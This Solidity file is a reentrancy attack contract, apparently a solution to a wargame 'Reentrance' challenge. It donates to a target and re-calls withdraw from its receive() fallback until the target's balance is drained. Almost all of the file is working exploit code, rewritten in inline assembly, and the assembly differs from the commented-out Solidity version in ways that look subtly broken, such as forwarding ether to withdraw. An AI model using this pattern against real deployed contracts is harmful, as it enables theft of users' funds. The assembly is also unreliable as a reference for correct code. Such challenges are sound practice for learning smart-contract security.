// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

interface Reentrance {
    function withdraw(uint _amount) external;

    function donate(address _to) external payable;
}

contract ReentranceHack {
    Reentrance reentrance;

    constructor(address chal) {
        reentrance = Reentrance(chal);
    }

    // function donateAndWithdraw() public payable {
    //     reentrance.donate{value: msg.value}(address(this));
    //     reentrance.withdraw(msg.value);
    // }

    // receive() external payable {
    //     uint256 RemainingBalance = address(reentrance).balance;

    //     if (RemainingBalance > 0) {
    //         reentrance.withdraw(msg.value);
    //     }
    // }

    function donateAndWithdraw() public payable {
        assembly {
            mstore(0, "donate(address)")
            mstore(0, keccak256(0, 15))
            mstore(4, address())
            let donate_success := call(
                gas(),
                sload(0),
                callvalue(),
                0,
                0x24,
                0,
                0
            )
            if iszero(donate_success) {
                revert(0, 0)
            }

            mstore(0, "withdraw(uint256)")
            mstore(0, keccak256(0, 17))
            mstore(4, callvalue())
            let withdraw_success := call(
                gas(),
                sload(0),
                callvalue(),
                0,
                0x24,
                0,
                0
            )
            if iszero(withdraw_success) {
                revert(0, 0)
            }
        }
    }

    receive() external payable {
        assembly {
            if gt(balance(sload(0)), 0) {
                mstore(0, "withdraw(uint256)")
                mstore(0, keccak256(0, 17))
                mstore(4, callvalue())
                let withdraw_success := call(
                    gas(),
                    sload(0),
                    callvalue(),
                    0,
                    0x24,
                    0,
                    0
                )
                if iszero(withdraw_success) {
                    revert(0, 0)
                }
            }
        }
    }
}
